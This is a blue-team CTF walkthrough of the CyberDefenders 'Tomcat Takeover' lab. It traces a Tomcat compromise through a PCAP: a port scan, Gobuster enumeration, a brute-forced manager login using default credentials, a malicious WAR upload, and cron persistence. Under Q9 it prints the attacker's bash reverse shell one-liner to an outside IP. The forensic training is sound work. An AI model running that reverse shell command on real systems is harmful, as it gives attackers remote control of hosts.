# CyberDefenders----Tomcat-Takeover-Lab-
CyberDefenders — Tomcat Takeover Lab Walkthrough

INTRO

The "Tomcat Takeover" challenge on CyberDefenders is a Blue Team CTF exercise designed to test our skills in investigating and responding to security incidents within a Tomcat server environment. As a Blue Teamer, we'll be presented with a scenario where a Tomcat server has potentially been compromised, and it's our mission to analyze the available evidence, identify the attack vectors, and determine the extent of the damage.

Context
This challenge focuses on the popular Apache Tomcat server, an open-source implementation of the Java Servlet, JavaServer Pages, Java Expression Language, and Java WebSocket technologies. Tomcat is widely used to host web applications, making it a common target for attackers.

In "Tomcat Takeover," we'll likely encounter scenarios involving:

- Log Analysis: Examining Tomcat logs (e.g., access logs, catalina logs) to identify suspicious activity, unusual requests, and potential exploits.

- Web Application Vulnerabilities: Investigating potential weaknesses in deployed web applications that could be exploited to gain unauthorized access.

- Configuration Review: Analyzing Tomcat's configuration files to identify misconfigurations or insecure settings that could be leveraged by attackers.

- Malware Detection: Searching for malicious files or code that may have been uploaded or injected into the Tomcat server.

By participating in this challenge, we will gain practical experience in essential Blue Team skills, such as incident response, log analysis, and web application security. We will also deepen your understanding of Tomcat server security and common attack techniques targeting Java-based web applications. Let's go!

Link to the challenge: https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/

SCENARIO

The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope of the attack.

TOOLS

- WIRESHARK [[https://www.wireshark.org/]: network protocol analyzer.
- NETWORK MINER [https://www.netresec.com/?page=NetworkMiner]: open source network forensics tool that extracts artifacts, such as files, images, emails and passwords, from captured network traffic in PCAP files.

WALKTHROUGH

Q1) Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?

We started by opening the .pcap file with Wireshark to analyze the network traffic of that intranet environment of the company.

If we go to the Statistics option – Conversations, we will see that all «conversations » or requests between different IPs are recorded and we also see the number of packets that have been exchanged, etc.

In this case we see that the IP origin 14.0.0.120It has sent a 19K super high volume of requests to the destination IP 10.0.0.112, so it already indicates that we effectively intuit that this high volume of requests is being sent because a ping or scan is being done to the destination IP trying to find perhaps open ports or vulnerable directories, etc.

![q1](https://github.com/user-attachments/assets/254c9345-7890-433b-9f4d-59e03d6d3815)

Q2) Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?

We perform a basic research on the Web to find that the attacker IP address is located in China.

![q2](https://github.com/user-attachments/assets/992dc863-abf4-4bcb-aff6-d6049212b0fb)

Q3) Among the various open ports detected during the scan, one provides access to the web server’s administrative panel. Which port number corresponds to the admin panel?

I have used the filter ip.addr==14.0.0.120 && http to see only HTTP communication between the attacker and the server, and by analyzing the HTTP stream we can wee find the PORT used by the attacker to perpetrate the attack (8080)

![q3](https://github.com/user-attachments/assets/b8fe6836-272a-4964-a7ac-08504f3a51d1)

Q4. The attacker used certain tools to enumerate files and directories on the compromised web server. What tool(s) can you identify from the analysis that the attacker used for this enumeration process?

If we scroll down, we can see that there are multiple requests that have a 404 server responses which mean this pattern could indicate a brute force attack and if we follow HTTP stream for any of them we might identify the tool the attacker used: Gobuster

![q4](https://github.com/user-attachments/assets/89a49776-b7a6-4de0-acee-dbe492e037e2)

Q5. During the enumeration process, the attacker was able to locate the directory associated with the administrative interface. What is the name of this directory?

After the brute force attack, we observe a 200 server response, which indicates that the server has processed the client’s request successfully and returned the requested data. By examining the HTTP stream, we can determine which directory the attacker accessed.

![q5](https://github.com/user-attachments/assets/3fb8505e-6e78-48b6-82f3-c6ae5a42066a)

Q6. After finding the admin panel, the attacker attempted a brute force attack to gain access. What username and passing-code combination did they successfully use?

We can use two methods to find the following answer:

1) on Wireshark, input the following filter search: 
- ip.addr==14.0.0.120 --> this will filter the relevant traffic only from the attacker IP address
- http.request.method==POST --> the POST request method in HTTp is used to sedn data to h server for processing, creation or modification of resources. 

![q7](https://github.com/user-attachments/assets/7a641f38-e961-4f9f-bc1e-4c6773b0488b)

Brute force attacks (like in our case with Gobuster)  often involve repeated submission of login credential via the HTPP POST request containing credentials in their body: filtering for POST isolates traffic where attackers likely send username/passing-code combinations (aka.secret authentication credentials)

2) simply head on Network Miner and analyses he credential tab
3) 
![q7-2](https://github.com/user-attachments/assets/46cad778-2a2c-49ed-9e32-dfaf8f1ffbc9)

Q8) Once authenticated, the attacker uploaded a malicious file with the intent to create a reverse shell. What is the name of the file uploaded?

To find out, we re-analyze the list of http requests that the attacker was sending to the destination IP, and knowing that in this case it is uploading a file, we analyze the POST methods for something that indicates that a file has been uploaded. file.

If we select that POST request and follow the stream, we can see the file upload and the name: JXQOZY.war

![q8](https://github.com/user-attachments/assets/665725ec-0ebb-4a89-be46-2544c51aee0a)

Attacker chose an extension file .war because these types of files are used by Java servers as Apache Tomcat to deploy web applications.

Q9) To maintain persistence on the compromised server, the attacker scheduled a command to ensure they could reconnect later. What is the exact command they used?

Here what we do is again is to track requests from the previous POST where the attacker uploaded the malicious file; to do so we can use the following filter in Wireshark:

ip.src==14.0.0.120 && tcp.flags==0x012

![q9-1](https://github.com/user-attachments/assets/e744f577-9dd1-451a-9aa8-0f486a5bb6f5)

where:

- ip.scr==14.0.0.120 --> filters packets where 14.0.0.120 is the IP source address of the traffic.
- tcp.flags==0x012 --> filters TCP packets where SYN and SCk flags are set simultaneously.

We then see that the request already changes to TCP because the communication is done through port 443. If we analyze that request, following the TCP stream we see that it interacts with the victim machine saying whoami, etc., and includes a cron tab command to constantly run persistently.

![q9-2](https://github.com/user-attachments/assets/6a8d601b-4d44-4fdc-956b-5125602b50cb)

![q9](https://github.com/user-attachments/assets/287a90e8-3d05-48d3-b2f3-8648d79cdedf)

/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'

Summary:
To solve this laboratory we first analyze with Wireshark a network traffic file. In it we detect that an attacker, from the IP 14.0.0.120 (located in China), performed a port scan and found the web server available on the port 8080, where you tried to access confidential directories like / admin and / manager using a called tool Gobuster.

After multiple attempts he managed to authenticate himself with the credentials admin: tomcat. Once inside, he uploaded a malicious file called JXQOZY.war, specially designed to execute commands on the server.

After uploading the malicious file, the attacker managed to obtain remote access to the server through a reverse shell, a technique that allows you to control a machine remotely.

To maintain this access even after restarting the server, you programmed a command in crontab that automatically ran every minute, ensuring that it could always reconnect and maintain its presence.

CONCLUSIONS

The Tomcat Takeover challenge provides critical hands-on experience in analyzing network traffic to detect and respond to attacks targeting Apache Tomcat servers. Participants must dissect a PCAP file to identify malicious activities such as active scanning, credential brute-forcing, web shell uploads, and persistence mechanisms like cron jobs. By mapping these actions to the MITRE ATT&CK framework (e.g., T1595.002 for scanning, T1078 for valid accounts, T1505.003 for web shells), the challenge reinforces Blue Team skills in network forensics, log analysis, and threat hunting.

Key lessons include the importance of monitoring for anomalous port scanning, enforcing strong credentials (avoiding defaults like admin/tomcat), and restricting access to sensitive interfaces like the Tomcat Manager panel. To protect against similar attacks, organizations should implement multi-factor authentication, regularly audit configurations, and deploy network monitoring tools to detect unauthorized file uploads or reverse shell attempts. Additionally, hardening Tomcat installations—such as disabling unused ports, limiting administrative access, and enabling security headers—can mitigate risks. The challenge underscores the value of proactive defense strategies and incident response training to counter modern web server exploitation techniques.

I want to thank the team of CyberDefenders.org and the challenge creators for a concise, yet insightful Lab as the practical application of concepts made this far more valuable than theoretical learning alone. I appreciate the time and effort put into creating such a valuable resource for the cybersecurity community. Thank you for contributing to my growth as a blue team analyst!

I hope you found this walkthrough insightful as well! If you found this content helpful, please consider giving it a clap! Your feedback is invaluable and motivates me to continue supporting your journey in the cybersecurity community. Remember, LET'S ALL BE MORE SECURE TOGETHER! For more insights and updates on cybersecurity analysis, follow me on Substack! [https://substack.com/@atlasprotect?r=1f5xo4&utm_campaign=profile&utm_medium=profile-page]
